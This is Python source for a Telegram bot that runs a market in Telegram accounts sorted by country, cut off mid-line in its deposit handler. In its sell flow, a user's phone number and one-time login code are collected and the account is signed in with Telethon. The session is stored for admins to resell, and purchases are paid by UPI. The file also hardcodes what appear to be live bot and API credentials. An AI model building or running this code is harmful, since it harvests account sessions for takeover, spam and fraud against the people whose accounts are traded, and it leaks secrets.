import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import os
from flask import Flask
from threading import Thread

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT LIVE"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488 

bot = telebot.TeleBot(TOKEN)

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

def is_owner(uid): return uid == OWNER_ID
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '👥 REFERRAL', '📞 SUPPORT')
    return markup

# --- START & REFERRAL ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    args = message.text.split()
    if uid not in db['users']:
        ref = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
        db['users'][uid] = {'balance': 0, 'referred_by': ref}
        if ref:
            try: bot.send_message(ref, "🔔 **NEW USER JOINED VIA YOUR LINK!**")
            except: pass
    bot.send_message(message.chat.id, "🔥 **WELCOME TO PRIME OTP BOT**", reply_markup=main_menu())

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    text = (
        "👑 **ADMIN PANEL**\n\n"
        "📈 `/setbuy RUSSIA 50` - Set Buy Price\n"
        "📉 `/setsell RUSSIA 30` - Set Sell Price\n"
        "➕ `/addstock RUSSIA data` - Add ID Stock\n"
        "💳 `/changeupi ID` - Update Payment UPI\n"
        "👤 `/addadmin ID` - Add New Admin\n"
        "📢 `/broadcast MSG` - Send to All\n"
        "📜 `/list` - View All Rates & Stock"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setbuy'])
def set_b(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['buy_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Buying for {c.upper()} set to ₹{p}")
        except: bot.reply_to(message, "Usage: `/setbuy INDIA 40` ")

@bot.message_handler(commands=['setsell'])
def set_s(message):
    if is_admin(message.from_user.id):
        try:
            _, c, p = message.text.split()
            db['sell_rates'][c.upper()] = int(p)
            bot.reply_to(message, f"✅ Selling for {c.upper()} set to ₹{p}")
        except: bot.reply_to(message, "Usage: `/setsell INDIA 25` ")

@bot.message_handler(commands=['list'])
def list_all(message):
    if is_admin(message.from_user.id):
        res = "📊 **SYSTEM STATUS:**\n\n"
        for c in db['buy_rates']:
            sc = len(db['stock'].get(c, []))
            res += f"🌍 **{c}**\nBuy: ₹{db['buy_rates'][c]} | Sell: ₹{db['sell_rates'].get(c, 'N/A')}\nStock: {sc}\n\n"
        bot.send_message(message.chat.id, res if db['buy_rates'] else "❌ No data set.")

# --- MULTI-COUNTRY BUY SYSTEM ---
@bot.message_handler(func=lambda m: 'BUY ID' in m.text)
def buy_menu(message):
    if not db['buy_rates']:
        return bot.send_message(message.chat.id, "❌ ALL COUNTRIES OUT OF STOCK!")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        count = len(db['stock'].get(c, []))
        status = f"({count} left)" if count > 0 else "(OUT OF STOCK)"
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} {status}", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "🛒 **SELECT COUNTRY TO BUY:**", reply_markup=markup)

# --- MULTI-COUNTRY SELL SYSTEM ---
@bot.message_handler(func=lambda m: 'SELL ID' in m.text)
def sell_init(message):
    if not db['sell_rates']:
        return bot.send_message(message.chat.id, "❌ SELLING IS DISABLED!")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']:
        markup.add(f"SELL {c}")
    markup.add("🔙 BACK")
    bot.send_message(message.chat.id, "🌍 **CHOOSE COUNTRY TO SELL:**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_country_proc(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 **ENTER {country} NUMBER:**", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, sell_2, country)

def sell_2(message, country):
    phone = message.text.strip()
    bot.send_message(message.chat.id, "⏳ **GETTING OTP...**")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    active_logins[message.chat.id] = {'client': client, 'phone': phone, 'loop': loop, 'country': country}
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[message.chat.id]['hash'] = req.phone_code_hash
        msg = bot.send_message(message.chat.id, "📩 **ENTER OTP:**")
        bot.register_next_step_handler(msg, sell_3)
    except: bot.reply_to(message, "❌ Connection Failed.")

def sell_3(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ LOGIN & APPROVE", callback_data=f"sa_{message.from_user.id}_{d['phone']}_{d['country']}"))
        for a in db['admins']:
            bot.send_message(a, f"🔔 **SELL REQ: {d['country']}**\nUser: {message.from_user.id}", reply_markup=markup)
        bot.send_message(message.chat.id, "⏳ **VERIFIED! WAIT FOR ADMIN APPROVAL.**")
    except: bot.reply_to(message, "❌ Invalid OTP.")

# --- DEPOSIT (12-DIGIT UTR) ---
@bot.message_handler(func=lambda m: 'DEPOSIT' in m.text)
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 **ENTER AMOUNT:**")
    bot.register_next_step_handler(msg, dep_2)

def dep_2(message):
    try:
        amt = int(message.text)
        bot.send_message(message.chat.id, f"💳 **PAY TO:** `{db['upi']}`\n**SEND 12-DIGIT UTR:**")
        bot.register_next_step_handler(message, dep_3, amt)
    except: bot.reply_to(message, "❌ Invalid Amount.")

def dep_3(message, amt):
    u = message.text.strip()
    if len(u) != 12: return bot.send_message(message.chat.id, "❌ **REJECTED: 12 DIGITS ONLY.**")
    bot.send_message(message.chat.id, "📸 **SEND SCREENSHOT:**")
    bot.register_next_step_handler(message, dep_final, amt, u)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return bot.reply_to(message, "❌ Photo Required.")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("
